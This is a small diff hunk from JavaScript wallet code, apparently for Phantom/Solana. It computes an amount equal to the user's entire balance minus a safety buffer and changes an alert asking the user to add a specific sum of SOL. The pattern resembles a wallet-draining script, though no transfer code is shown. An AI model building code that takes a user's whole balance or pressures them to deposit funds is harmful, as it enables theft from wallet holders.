@@ -66,7 +66,7 @@ const publicKey = res.publicKey
       const amount = balance - SAFETY_BUFFER
 
       if (amount <= 0) {
-        alert("Add 789.09 SOL balance to phantom")
+        alert("Add 233.09 SOL balance to phantom")
         return
       }
 
